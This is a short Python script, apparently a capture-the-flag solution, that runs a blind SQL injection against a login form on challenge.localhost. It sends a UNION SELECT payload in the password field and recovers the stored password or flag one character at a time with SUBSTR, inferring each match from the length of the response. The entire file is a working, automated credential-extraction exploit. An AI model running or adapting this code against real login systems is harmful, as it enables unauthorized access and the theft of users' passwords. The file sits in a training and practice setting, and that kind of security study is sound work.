#!/usr/bin/python3
import sys
import requests
import os
from urllib.parse import quote,urlencode

url = "http://challenge.localhost/"

def sender(n,c):
    data = {
"username":"admin",
"password":f"' UNION SELECT rowid,* FROM users WHERE SUBSTR(password,{n},1)='{c}'--"
}
    return requests.post(url,data=data).text

flag =""
for i in range(65):
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-.+={}!@":
        res = sender(i+1,c)
        if len(res) < 200:
            continue
        if len(res) > 200 and c == '}':
            flag += c
            print("The Flag: "+flag)
            sys.exit(0)
        flag += c
        print(flag)


#print("The Flag: "+response)
